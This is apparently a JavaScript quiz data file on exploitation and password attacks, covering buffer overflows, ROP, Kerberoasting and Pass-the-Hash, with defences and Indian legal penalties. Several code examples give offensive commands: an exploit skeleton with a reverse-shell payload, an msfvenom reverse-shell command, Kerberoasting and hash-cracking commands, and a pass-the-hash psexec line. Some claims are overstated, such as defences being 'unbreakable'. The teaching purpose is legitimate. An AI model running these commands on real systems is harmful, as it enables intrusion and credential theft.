const questions = [
  {
    question: "What is a 'Stack-Based Buffer Overflow', and what low-level memory vulnerability enables it in languages like C and C++?",
    shortAnswer: "Writing more data into a fixed stack memory buffer than it was allocated to hold, overwriting adjacent memory including the function's Saved Frame Pointer (EBP) and Return Address (EIP/RIP).",
    explanation: "In memory-unsafe languages like C/C++, functions allocate stack buffers using unsafe functions (such as `strcpy()`, `gets()`, `scanf()`, or `sprintf()`) without bounds checking. If an attacker inputs 1,000 bytes into a 100-byte array, the excess bytes spill over the stack boundary, overwriting the saved base pointer and the function's return address pointer in CPU memory.",
    hint: "Think about pouring two liters of liquid into a one-liter glass until it overflows and covers the steering wheel.",
    level: "basic",
    codeExample: `// Vulnerable C Code (Missing Bounds Check):
void vulnerableFunc(char *str) {
    char buffer[64];
    strcpy(buffer, str); // UNSAFE: No check if strlen(str) > 64!
}
int main(int argc, char *argv[]) {
    vulnerableFunc(argv[1]);
}`
  },
  {
    question: "In x86 CPU architecture, what is the role of the Instruction Pointer register (`EIP`), and why is controlling it the primary objective of a buffer overflow exploit?",
    shortAnswer: "`EIP` (Extended Instruction Pointer) holds the memory address of the next machine instruction the CPU will execute; by overwriting EIP with a custom memory address, the attacker redirects CPU execution to their own injected shellcode.",
    explanation: "The CPU executes instructions sequentially by reading the memory address stored in the EIP register (or RIP in 64-bit). When a function finishes execution, it executes the `RET` instruction, which pops the return address off the stack into EIP. If an attacker has overwritten that saved return address with the address of their shellcode in RAM, the CPU jumps directly into the attacker's payload.",
    hint: "Remember that EIP is the CPU's navigation compass telling it where to go next.",
    level: "moderate",
    codeExample: `// Overwriting EIP in Memory:
[ Buffer (64 bytes) ] -> [ EBP (4 bytes) ] -> [ Saved EIP (4 bytes: 0x42424242 / 'BBBB') ]
// When function returns: CPU attempts to execute instructions at memory address 0x42424242!`
  },
  {
    question: "What are the six sequential steps required to build a working stack-based buffer overflow exploit from scratch?",
    shortAnswer: "1. Spiking/Fuzzing (Find crash length), 2. Finding Offset (pattern_create/pattern_offset), 3. Overwriting EIP, 4. Finding Bad Characters, 5. Locating JMP ESP instruction, 6. Injecting NOP sled + Shellcode.",
    explanation: "Classic buffer overflow exploitation follows a structured 6-step lifecycle: 1. Fuzzing: Sending increasing byte lengths to find the crash point; 2. Finding Offset: Using cyclical patterns to determine exact byte position that controls EIP; 3. Overwriting EIP: Confirming 4 bytes of control (e.g. `\x42\x42\x42\x42`); 4. Bad Character Identification: Eliminating bytes that corrupt memory (like `\x00` null byte); 5. Finding JMP ESP: Locating a static `\xff\xe4` instruction in a loaded DLL without memory protections; 6. Shellcode Delivery: Prepending a NOP sled (`\x90`) and shellcode.",
    hint: "Recall the 6 steps: Fuzz, Find Offset, Control EIP, Strip Bad Chars, Find JMP ESP, Inject Shellcode.",
    level: "expert",
    codeExample: `// Buffer Overflow Exploit Skeleton (Python):
offset = 2006
overflow = "A" * offset
retn = struct.pack("<I", 0x625011af) # JMP ESP address in essfunc.dll
nopsled = "\x90" * 32
payload = b"\xdb\xc0\xd9\x74\x24\xf4..." # msfvenom reverse shell
buffer = overflow + retn + nopsled + payload`
  },
  {
    question: "What is a 'NOP Sled' (`\x90\x90\x90...`), and why is it prepended before shellcode in buffer overflow payloads?",
    shortAnswer: "A sequence of No-Operation (`NOP` / `0x90`) machine instructions that slides the CPU execution pointer down into the shellcode, compensating for minor memory address fluctuations in RAM.",
    explanation: "Stack memory addresses can shift slightly depending on environment variables and operating system states. If an exploit jumps directly to an exact shellcode memory address, a 4-byte shift causes the exploit to crash. By placing a 16-to-64 byte 'NOP Sled' before the shellcode, the CPU executes `NOP` (which does nothing and advances EIP by 1 byte) until it smoothly slides directly into the first instruction of the shellcode.",
    hint: "Think of creating a slippery runway of ice so even if a plane lands slightly off-target, it slides into the hangar safely.",
    level: "moderate",
    codeExample: `// NOP Sled Execution in RAM:
CPU Jumps to: 0x0012FF40 -> [ 0x90 NOP ] -> [ 0x90 NOP ] -> [ 0x90 NOP ] -> [ SHELLCODE EXECUTION! ]`
  },
  {
    question: "What is a 'Bad Character' (such as `\x00` NULL byte), and how does an exploit author identify and remove bad characters from shellcode?",
    shortAnswer: "Byte values that the application interprets as control characters (e.g., `\x00` string terminator, `\x0a` newline) which truncate or corrupt the exploit payload; identified by sending all 256 byte values and comparing memory in a debugger.",
    explanation: "In C strings, `\x00` is the NULL string terminator. If an exploit payload contains `\x00`, functions like `strcpy()` stop reading immediately, truncating the payload. Exploit authors send an array containing `\x01` through `\xff` to the victim and inspect the stack memory in Immunity Debugger. Any missing or corrupted byte is flagged as a 'bad character' and excluded when generating shellcode with `msfvenom -b \"\\x00\\x0a\\x0d\"`.",
    hint: "Think about characters that cause a computer program to stop reading or hit the Enter key prematurely.",
    level: "expert",
    codeExample: `// Generating Shellcode without Bad Characters (msfvenom):
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -b "\x00\x0a\x0d" -f c`
  },
  {
    question: "What is 'Password Spraying', and how does it differ from a traditional Brute-Force attack?",
    shortAnswer: "Traditional brute-force tests thousands of passwords against a single user (triggering account lockouts); Password Spraying tests one common password across thousands of different usernames to stay under lockout thresholds.",
    explanation: "Enterprise Active Directory domains typically enforce account lockout policies (e.g. 5 failed login attempts locks the account for 30 minutes). If an attacker runs a dictionary attack on `admin`, the account locks out on attempt #5. In Password Spraying, the attacker takes 10,000 corporate usernames and tries a single seasonal password (e.g. `Autumn2026!`). Because each user receives only 1 failed attempt, account lockout thresholds are never triggered.",
    hint: "Contrast trying 1,000 keys on one front door versus trying 1 common key on 1,000 different houses on the street.",
    level: "basic",
    codeExample: `// Password Spraying Strategy:
User 1 (mamata):    Test "Winter2026!" -> (Failed - Attempt 1/5)
User 2 (debangshu): Test "Winter2026!" -> (SUCCESS - Logged in!)
User 3 (mahima):    Test "Winter2026!" -> (Failed - Attempt 1/5)`
  },
  {
    question: "What is 'Hashcat', and why is GPU-accelerated cracking millions of times faster than CPU cracking for offline password recovery?",
    shortAnswer: "Hashcat leverages the massively parallel computing architecture of GPUs (thousands of lightweight compute cores) to compute billions of cryptographic hash permutations per second.",
    explanation: "CPUs are optimized for complex sequential tasks with 8 to 32 powerful cores. Graphics Processing Units (GPUs) contain thousands of smaller stream processors (e.g. 16,384 CUDA cores in modern NVIDIA RTX GPUs) designed for parallel arithmetic. Because calculating NTLM or MD5 hashes involves simple bitwise XOR and shift operations, a modern GPU tests over 100 Billion NTLM hashes per second, cracking complex 8-character passwords in minutes.",
    hint: "Think of using thousands of small calculators working simultaneously rather than a single professor working alone.",
    level: "moderate",
    codeExample: `// Hashcat NTLM Cracking Command:
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
// Speed: 85,000 MH/s (85 Billion hashes per second on RTX 4090 GPU!)`
  },
  {
    question: "What is the difference between an 'NTLM Hash' and a 'NetNTLMv2 Challenge-Response Hash' in Windows authentication?",
    shortAnswer: "An NTLM hash is a static MD4 hash of the user's password stored in the SAM database or LSASS RAM (usable in Pass-the-Hash); NetNTLMv2 is a dynamic challenge-response hash sent over the network (cannot be used for Pass-the-Hash, must be cracked offline).",
    explanation: "When Windows stores a password locally (in `SAM` or `NTDS.dit`), it uses the NTLM hash: `MD4(UTF-16LE(password))`. If an attacker dumps an NTLM hash, they can log into remote servers directly via Pass-the-Hash without cracking the plaintext. NetNTLMv2 is a challenge-response handshake generated over the network using a server nonce and client timestamp; it cannot be used for Pass-the-Hash and must be cracked offline using Hashcat (`-m 5600`).",
    hint: "Remember that static NTLM hashes can be passed directly, while network NetNTLMv2 hashes must be cracked offline.",
    level: "expert",
    codeExample: `// Hash Type Distinctions:
NTLM (Static Hash):        aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c (Pass-the-Hash!)
NetNTLMv2 (Network Nonce): mamata::DOMAIN:1122334455667788:A9C8... (Crack via Hashcat -m 5600)`
  },
  {
    question: "What are 'Stack Canaries' (GCC `-fstack-protector`), and how do they detect and defeat buffer overflow attacks before EIP is overwritten?",
    shortAnswer: "A random integer placed on the stack immediately before the saved return address; when the function returns, the CPU checks if the canary value was altered, immediately terminating the process if modified.",
    explanation: "Stack Canaries (named after canaries used in coal mines to detect toxic gas) place a random 4-byte or 8-byte value (stored in a thread-local segment `fs:0x28`) on the stack frame between the local variables and the saved EBP/EIP. Before returning, the function executes `xor eax, [canary]`. If a buffer overflow has occurred, the canary was overwritten, the check fails, and the OS terminates the process instantly (`*** stack smashing detected ***`).",
    hint: "Think of putting a fragile wax seal on an envelope: if someone tampers with the letter, the seal breaks and alarms sound.",
    level: "moderate",
    codeExample: `// Stack Frame with Canary Protection:
[ Local Buffer ] -> [ Stack Canary (0x0041F89A) ] -> [ Saved EBP ] -> [ Return Address EIP ]
// If buffer overflows, the Canary is corrupted -> CPU calls __stack_chk_fail() and halts!`
  },
  {
    question: "What is 'Address Space Layout Randomization' (ASLR), and how does it prevent an exploit from jumping to a hardcoded `JMP ESP` memory address?",
    shortAnswer: "ASLR randomizes the starting memory addresses of the stack, heap, and executable code modules on every system reboot, making hardcoded exploit memory pointers jump into invalid RAM.",
    explanation: "In systems without ASLR, an instruction like `JMP ESP` always sits at the exact same virtual memory address (e.g. `0x625011af`). The attacker hardcodes this address into their payload. ASLR randomizes the memory base address of libraries every time the OS boots. When the exploit triggers, jumping to `0x625011af` hits random unmapped memory, causing a segmentation fault rather than executing shellcode.",
    hint: "Think of reshuffling all the hotel room numbers every single morning so nobody can remember where the secret door is.",
    level: "moderate",
    codeExample: `// ASLR in Action across Reboots:
Boot 1: ntdll.dll loaded at 0x77050000 -> JMP ESP is at 0x77081234
Boot 2: ntdll.dll loaded at 0x75120000 -> JMP ESP is at 0x75151234 (Hardcoded exploit crashes!)`
  },
  {
    question: "What is 'Return-Oriented Programming' (ROP), and how do advanced binary exploit authors use it to bypass Data Execution Prevention (DEP/NX)?",
    shortAnswer: "Chaining short sequences of pre-existing machine instructions ending in `RET` (called 'gadgets') located in executable memory to call operating system APIs (like `VirtualProtect`) to make the stack executable.",
    explanation: "When DEP/NX marks stack memory as non-executable, the CPU refuses to run injected shellcode on the stack. In Return-Oriented Programming (ROP), the attacker does not inject new code. Instead, they find existing snippets of code in executable DLLs that end with a `ret` instruction (e.g. `pop eax; ret`, `mov [ebx], eax; ret`). By chaining these 'ROP gadgets' together, the attacker executes complex logic to call `VirtualProtect()`, turning DEP off for the stack memory, and then executing their shellcode.",
    hint: "Think of creating a new ransom letter by cutting out individual printed words from legitimate magazines.",
    level: "expert",
    codeExample: `// ROP Gadget Chain (Calling VirtualProtect):
Gadget 1: 0x62501020 (pop eax; ret)           -> Loads 0x40 (PAGE_EXECUTE_READWRITE) into EAX
Gadget 2: 0x62501045 (pop ebx; ret)           -> Loads Target Stack Address into EBX
Gadget 3: 0x62501080 (call VirtualProtect; ret) -> Disables DEP protection on stack!`
  },
  {
    question: "What is 'Kerberoasting', and how does it allow an authenticated domain user to extract and crack service account password hashes offline?",
    shortAnswer: "Requesting Kerberos Service Ticket (TGS) tickets for Service Principal Names (SPNs) from the Domain Controller and extracting the encrypted ticket to crack the service account password offline.",
    explanation: "In Active Directory, service accounts (used for SQL, IIS, Exchange) register Service Principal Names (SPNs). Any valid domain user can request a Kerberos TGS ticket for any registered SPN. The Domain Controller encrypts the ticket using the NTLM hash of the service account. The attacker requests the ticket, extracts the ciphertext using Mimikatz or Rubeus, and cracks it offline using Hashcat (`-m 13100`), uncovering plaintext domain service passwords.",
    hint: "Think of asking the receptionist for a sealed envelope meant for the IT manager and taking it home to crack the wax seal.",
    level: "expert",
    codeExample: `// Kerberoasting Execution:
GetUserSPNs.py fintech.co.in/mamata:Password123! -request -outputfile kerberoast_hashes.txt
// Crack Offline via Hashcat:
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt`
  },
  {
    question: "What is 'John the Ripper' (JtR), and how does it use Wordlists and Mangling Rules during credential cracking audits?",
    shortAnswer: "A fast, open-source password cracker that tests wordlist dictionaries and applies automated mangling rules (e.g. capitalizing first letters, appending years, leetspeak) to break password hashes.",
    explanation: "John the Ripper (JtR) automatically identifies hash algorithms (`$6$` for SHA-512 crypt, `$1$` for MD5, NTLM). When supplied with a wordlist (`rockyou.txt`) and mangling rules (`--rules=Jumbo`), JtR takes each dictionary word (e.g. `password`) and automatically generates hundreds of permutations (`Password1`, `p@ssw0rd!`, `password2026`), hashing each variant and comparing it against the target hash file.",
    hint: "Remember the iconic open-source password cracking tool named after the famous historical alias.",
    level: "basic",
    codeExample: `// John the Ripper Cracking Command:
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hashes.txt
// Output:
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Kolkata2026!     (mamata)`
  },
  {
    question: "What is a 'Cryptographic Salt', and why does salting completely defeat Pre-computed Rainbow Table attacks?",
    shortAnswer: "A unique, random cryptographic string added to a password before hashing; because every user has a unique salt, pre-computed rainbow tables cannot match the resulting hash.",
    explanation: "A Rainbow Table is a massive pre-computed database of plaintext passwords and their corresponding hashes (e.g. `MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99`). If a database stores unsalted hashes, attackers look up hashes in seconds. When a system salts passwords (`SHA256(password + salt)`), two users with the identical password `password123` produce completely different hash strings, rendering pre-computed lookup tables 100% useless.",
    hint: "Think of adding a unique secret pinch of seasoning to every recipe so no two dishes ever look or taste identical.",
    level: "basic",
    codeExample: `// Unsalted vs Salted Hashes:
Unsalted:  MD5("Secret123")         -> 5ebe2294ecd0e0f08eab7690d2a6ee69 (Instant Rainbow Table Lookup!)
Salted:    SHA256("Secret123" + "9f!k2@") -> 8a4c12b98e... (Unique per user, Rainbow Tables defeated!)`
  },
  {
    question: "What is 'Pass-the-Hash' (PtH), and how does it allow an attacker to authenticate across Windows systems without knowing the plaintext password?",
    shortAnswer: "Submitting the captured NTLM hash directly to the NTLM authentication protocol over SMB/RPC without ever cracking or knowing the cleartext password.",
    explanation: "Windows NTLM authentication uses the NTLM hash itself as the secret key in authentication challenges. If an attacker extracts an NTLM hash from LSASS memory using Mimikatz (`admin:8846f7eaee8fb117ad06bdd830b7586c`), they do not need to crack it. Using tools like `psexec.py -hashes :8846f7... admin@192.168.1.50`, the attacker submits the hash directly to the remote server, which accepts it and opens an Administrator shell.",
    hint: "Think of presenting a wax impression of a key directly to a lock without ever carving the metal key.",
    level: "moderate",
    codeExample: `// Pass-the-Hash Execution via Impacket:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.1.50`
  },
  {
    question: "What is 'Argon2id' and 'Bcrypt', and why are slow, memory-hard key derivation functions recommended over fast algorithms like SHA-256 for password storage?",
    shortAnswer: "They are deliberately computationally expensive and require large amounts of RAM (memory-hard), making parallel GPU and ASIC hardware password cracking economically and computationally impractical.",
    explanation: "Fast hash algorithms (MD5, SHA-1, SHA-256) were designed for digital signatures, calculating millions of hashes per second. This makes them terrible for passwords. Key Derivation Functions like Bcrypt and Argon2id (winner of the Password Hashing Competition) are deliberately slow and memory-hard. By requiring 64MB of RAM per hash verification, a GPU cannot run thousands of threads in parallel, reducing cracking speeds from 100 Billion/sec to 100/sec.",
    hint: "Think of a heavy vault door that takes 5 seconds of manual cranking to open, stopping anyone from testing 10,000 keys a minute.",
    level: "expert",
    codeExample: `// Modern Secure Password Hashing with Argon2id (Node.js/Python):
import argon2
hasher = argon2.PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = hasher.hash("UserSuperSecretPassword2026!")`
  },
  {
    question: "What is an 'Integer Overflow', and how can arithmetic truncation in C memory allocation lead to heap buffer overflows?",
    shortAnswer: "When an arithmetic operation exceeds the maximum value of an integer type, wrapping around to a tiny number; allocating memory with this small value while copying large data causes a heap overflow.",
    explanation: "If an unsigned 32-bit integer reaches `4,294,967,295` and adds 1, it wraps around to `0`. If an application calculates buffer size as `size = num_items * sizeof(int)`, an attacker provides a huge `num_items`. The multiplication overflows to 16 bytes. The program calls `malloc(16)` to allocate a tiny buffer, but then attempts to copy 10,000 items into it, corrupting heap memory and allowing code execution.",
    hint: "Think of an odometer on a car that rolls over from 999,999 back to 000,000.",
    level: "expert",
    codeExample: `// Integer Overflow Vulnerability:
size_t num = 0x40000001; // Huge number
size_t bytes = num * sizeof(int); // Overflows to 4 bytes!
char *buf = malloc(bytes);        // Allocates only 4 bytes!
memcpy(buf, user_data, num * sizeof(int)); // Heap Buffer Overflow!`
  },
  {
    question: "How does the 'GDB' debugger with 'PEDA' or 'GEF' plugins assist binary exploit authors during Linux stack inspection?",
    shortAnswer: "By providing enhanced colorized disassembly, register status displays, stack visualization, and automated pattern creation/offset detection commands during runtime execution.",
    explanation: "Standard GDB (GNU Debugger) provides basic text output. Plugins like GEF (GDB Enhanced Features) or PEDA (Python Exploit Development Assistance) enhance GDB for reverse engineering. When a program crashes, GEF automatically displays the CPU registers, the disassembled assembly instructions around the crash, the current stack frame contents, and allows commands like `pattern offset` to calculate EIP overwrite offsets in seconds.",
    hint: "Think of adding high-tech dashboards, gauges, and color screens to an old mechanic's toolbox.",
    level: "moderate",
    codeExample: `// GDB GEF Crash Inspection:
gdb-gef ./vulnerable_binary
gef> run $(python -c 'print "A"*1000')
// Displays: [!] Stopped at 0x41414141 in ?? () -> EIP Overwrite Confirmed!`
  },
  {
    question: "Under the Indian Information Technology Act 2000, what are the criminal penalties for executing buffer overflow exploits and harvesting corporate credentials?",
    shortAnswer: "Section 66 (Hacking) carries up to 3 years imprisonment and ₹5 Lakhs fine; Section 66C (Identity Theft / Password Harvesting) carries up to 3 years imprisonment and ₹1 Lakh fine.",
    explanation: "Deploying buffer overflow payloads to compromise systems constitutes criminal hacking under Section 66 of the IT Act 2000. Harvesting and cracking corporate employee password hashes violates Section 66C (Punishment for Identity Theft - using unique identification features, passwords of others). Both are cognizable offenses prosecuted by state cyber police and central investigative agencies.",
    hint: "Remember the specific Indian cyber law section (Section 66C) that punishes password and credential theft.",
    level: "basic",
    codeExample: `// Indian IT Act 2000 Prosecution:
Buffer Overflow / System Exploitation -> Section 66 (Up to 3 Years Prison + ₹5 Lakhs Fine)
Password Dumping / Hash Harvesting    -> Section 66C Identity Theft (Up to 3 Years Prison + ₹1 Lakh Fine)`
  },
  {
    question: "Synthesizing System Exploitation, Buffer Overflows, and Credential Attacks: what is the single most important architectural lesson for ethical developers and defenders?",
    shortAnswer: "Enforce defense-in-depth across compiler protections (Stack Canaries, ASLR, DEP), adopt memory-safe programming languages (Rust, Go), and enforce modern credential governance (Argon2id, FIDO2 MFA).",
    explanation: "Memory corruption vulnerabilities (buffer overflows, integer overflows) and credential attacks are not solved by firewalls alone. Modern security requires root-cause engineering: migrating mission-critical codebases to memory-safe languages (like Rust), compiling C/C++ with full hardening flags (`-fstack-protector-all -Wl,-z,relro,-z,now`), hashing passwords exclusively with Argon2id, and deploying phishing-resistant FIDO2 hardware authentication.",
    hint: "Conclude by recognizing that combining memory-safe software engineering with modern cryptographic standards permanently neutralizes system exploitation.",
    level: "expert",
    codeExample: `// The Secure Engineering Synthesis:
Memory_Safe_Code(Rust) + Compiler_Protections(Canaries_ASLR_DEP) + Modern_Crypto(Argon2id_FIDO2) = UNBREAKABLE_DEFENSE;`
  }
];

export default questions;
